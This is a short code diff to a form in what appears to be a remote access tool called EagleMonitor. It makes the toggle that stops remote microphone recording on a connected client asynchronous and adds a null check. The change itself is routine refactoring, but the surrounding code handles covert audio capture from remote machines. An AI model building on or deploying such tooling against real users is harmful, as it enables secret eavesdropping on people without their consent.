@@ -5,6 +5,7 @@ using PacketLib;
 using PacketLib.Packet;
 using System;
 using System.IO;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 /* 
@@ -44,7 +45,7 @@ namespace EagleMonitor.Forms
             ClientHandler.ClientHandlersList[baseIp].SendPacket(remoteAudioPacket);
         }
 
-        private void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
+        private async void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
         {
             if (captureGuna2ToggleSwitch.Checked)
             {
@@ -64,15 +65,20 @@ namespace EagleMonitor.Forms
             }
             else
             {
-                this.loadingCircle1.Visible = false;
-                this.loadingCircle1.Active = false;
-                RemoteAudioCapturePacket remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_OFF);
-                remoteAudioCapturePacket.HWID = ClientHandler.ClientHandlersList[baseIp].HWID;
-                this.clientHandler.SendPacket(remoteAudioCapturePacket);
-                ClientHandler.ClientHandlersList[baseIp].audioHelper.waveFileWriter.Close();
-                ClientHandler.ClientHandlersList[baseIp].audioHelper.bufferedWaveProvider.ClearBuffer();
-                hasAlreadyConnected = false;
-                ClientHandler.ClientHandlersList[baseIp].audioHelper.currentFileName = "";
+                if (clientHandler != null)
+                {
+                    this.loadingCircle1.Visible = false;
+                    this.loadingCircle1.Active = false;
+                    RemoteAudioCapturePacket remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_OFF);
+                    remoteAudioCapturePacket.HWID = ClientHandler.ClientHandlersList[baseIp].HWID;
+
+                    await Task.Run(() => this.clientHandler.SendPacket(remoteAudioCapturePacket));
+                    await Task.Run(() => this.clientHandler.Dispose());
+                    ClientHandler.ClientHandlersList[baseIp].audioHelper.waveFileWriter.Close();
+                    ClientHandler.ClientHandlersList[baseIp].audioHelper.bufferedWaveProvider.ClearBuffer();
+                    hasAlreadyConnected = false;
+                    ClientHandler.ClientHandlersList[baseIp].audioHelper.currentFileName = "";
+                }
             }
         }
 
